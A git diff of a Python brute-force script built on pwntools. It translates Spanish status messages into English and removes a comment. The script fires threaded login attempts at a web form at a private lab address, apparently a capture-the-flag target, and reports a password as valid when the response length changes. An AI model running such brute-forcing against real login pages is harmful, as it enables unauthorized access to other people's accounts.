@@ -11,14 +11,13 @@ from pwn import *
 
 
 def def_handler(sig, frame):
-    print("\n[!] Saliendo...\n")
+    print("\n[!] Exiting...\n")
     sys.exit(1)
 
 
 # Ctrl+C
 signal.signal(signal.SIGINT, def_handler)
 
-# Variables globales
 main_url = "http://10.10.10.46/index.php"
 
 check_data = {
@@ -41,7 +40,7 @@ def makeRequest(password, check):
     content_length = response.headers['Content-Length']
 
     if content_length != check:
-        p1.success(f"\n\nLa password {password} es válida\n")
+        p1.success(f"\n\n     {password}      is a valid password\n")
         sys.exit(0)
 
 
@@ -58,15 +57,15 @@ if __name__ == '__main__':
     top = 500
     counter = 1
 
-    p1 = log.progress("Fuerza bruta")
-    p1.status("Aplicando fuerza bruta")
+    p1 = log.progress("Brute force")
+    p1.status("Applying brute force")
     time.sleep(2)
     for password in passwords:
         thread = threading.Thread(target=makeRequest, args=(password, check,))
         threads.append(thread)
         thread.start()
 
-        p1.status(f"Probando password:   {password}   ({str(counter)}/{str(totalCounter)})")
+        p1.status(f"Trying password:   {password}   ({str(counter)}/{str(totalCounter)})")
 
         counter += 1
 
